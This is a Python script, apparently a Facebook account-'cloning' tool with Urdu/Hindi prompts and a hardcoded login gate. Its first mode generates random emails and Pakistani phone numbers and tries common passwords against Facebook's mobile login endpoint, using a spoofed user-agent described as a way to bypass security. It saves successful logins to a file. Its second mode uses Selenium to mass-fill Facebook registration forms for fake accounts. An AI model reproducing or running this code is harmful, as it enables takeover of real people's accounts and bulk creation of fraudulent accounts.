import os, sys, time, random, string, re
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
    os.system('pip install requests selenium webdriver-manager')
    os.execl(sys.executable, sys.executable, *sys.argv)

# --- COLORS & STYLING ---
G = '\033[1;92m' # Green
R = '\033[1;31m' # Red
W = '\033[1;37m' # White
Y = '\033[1;93m' # Yellow
B = '\033[1;94m' # Blue

# --- LOGIN (basitsultan / basitprince) ---
def login():
    os.system('clear')
    print(f"{G}" + "="*40)
    print(f"{Y}      BASIT SYCO SUPREME V3.0")
    print(f"{G}" + "="*40)
    u = input(f"{W}[+] Username: ")
    p = input(f"{W}[+] Password: ")
    if u == "basitsultan" and p == "basitprince":
        menu()
    else:
        print(f"{R}[!] Galat Details! Dobara koshish karein."); time.sleep(2); login()

# --- REAL-TIME CLONING ENGINE (LIVE RED/GREEN) ---
def universal_crack(user, pw_list):
    for pas in pw_list:
        try:
            session = requests.Session()
            # Professional User-Agent string to bypass security
            ua = "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
            url = "https://m.facebook.com/login.php"
            data = {"email": user, "pass": pas}
            header = {"User-Agent": ua, "Accept-Language": "en-US,en;q=0.9"}
            
            # Send real post request
            response = session.post(url, data=data, headers=header, allow_redirects=False)
            
            if "c_user" in session.cookies.get_dict():
                print(f"\r{G}[OK-SUCCESS] {user} | {pas} {W}")
                with open('ok.txt', 'a') as f: f.write(f"{user}|{pas}\n")
                return True
            else:
                # Tarteeb wise display as per your request
                print(f"\r{R}[FAILED-TRY] {user} | {pas} {W}", end="")
                sys.stdout.flush()
        except Exception:
            pass
    print(f"\n{R}[X] Not Found: {user}{W}")
    return False

# --- CLONING INTERFACE ---
def start_cloning():
    os.system('clear')
    print(f"{G}--- UNIVERSAL GLOBAL CLONER (LIVE) ---")
    print(f"{Y}[!] Ye tool emails aur numbers dono ko hit karega.")
    limit = int(input(f"{W}[+] Kitni IDs check karni hain?: "))
    
    targets = []
    for _ in range(limit):
        # Random Global Data Generation
        if random.choice([True, False]):
            # Email pattern
            name = "".join(random.choices(string.ascii_lowercase, k=5))
            user = name + str(random.randint(100, 999)) + random.choice(["@gmail.com", "@yahoo.com"])
        else:
            # Global Number pattern
            user = "03" + "".join(random.choices("0123456789", k=9))
        targets.append(user)

    print(f"\n{B}[*] Scanning Started Tarteeb Wise...\n")
    for user in targets:
        # Har target ke liye paka password logic
        name_part = user.split('@')[0] if '@' in user else user[2:7]
        p_list = [name_part+"123", "786786", "pakistan", "khan123", "123456", "112233"]
        universal_crack(user, p_list)
    
    input(f"\n{G}[!] Process Complete. Results saved in ok.txt. Enter to return...")

# --- REAL ID CREATION (PC AUTOMATION RESTORED) ---
def start_creation():
    os.system('clear')
    print(f"{G}--- REAL ID CREATION (PC BROWSER MODE) ---")
    print(f"{Y}[!] Note: Ise PC par chalayen taake Google Chrome asli account banaye.")
    
    count = int(input(f"{W}[+] Kitni IDs banani hain?: "))
    f_pass = input(f"{W}[+] Password kya rakhna hai?: ")

    try:
        # Chrome Driver Setup
        service = Service(ChromeDriverManager().install())
        options = webdriver.ChromeOptions()
        # options.add_argument('--headless') # Screen hide karne ke liye
        driver = webdriver.Chrome(service=service, options=options)

        for i in range(count):
            first = "".join(random.choices(string.ascii_uppercase, k=1)) + "".join(random.choices(string.ascii_lowercase, k=5))
            last = "Khan"
            email = first.lower() + str(random.randint(1000, 9999)) + "@mail7.io"
            
            print(f"{B}[{i+1}] Browser mein ID ban rahi hai: {email}")
            
            driver.get("https://m.facebook.com/reg/")
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "firstname"))).send_keys(first)
            driver.find_element(By.NAME, "lastname").send_keys(last)
            driver.find_element(By.NAME, "reg_email__").send_keys(email)
            driver.find_element(By.NAME, "reg_passwd__").send_keys(f_pass)
            
            # Form fill hone ke baad green show kare
            print(f"{G}[SUCCESS] Form Filled for {first}! Ab aap manually code daalein.{W}")
            with open('created_ids.txt', 'a') as f: f.write(f"{email}|{f_pass}\n")
            time.sleep(15) # Aapko 15 second milenge review ke liye

        driver.quit()
    except Exception as e:
        print(f"{R}[!] Error: Browser automation mobile par nahi chalti. PC par try karein! {W}")
        time.sleep(3)

def menu():
    os.system('clear')
    print(f"""{G}
  ____                 _   _     ____                    
 | __ )  __ _ ___ _ __| |_| |__ / ___| _   _  ___ ___  
 |  _ \ / _` / __| '__| __| '_ \\\\___ \\| | | |/ __/ _ \\ 
 | |_) | (_| \__ \ |  | |_| | | |___) | |_| | (_| (_) |
 |____/ \__,_|___/_|   \__|_| |_|____/ \__, |\___\___/ 
                                       |___/ {W}""")
    print(f"[1] Universal Cloning (Red/Green Live Status)")
    print(f"[2] Real ID Creation (PC Chrome Automation)")
    print(f"[0] Exit")
    ch = input(f"\n{B}Option Select Karein: ")
    if ch == '1': start_cloning()
    elif ch == '2': start_creation()
    else: sys.exit()

if __name__ == "__main__":
    login()
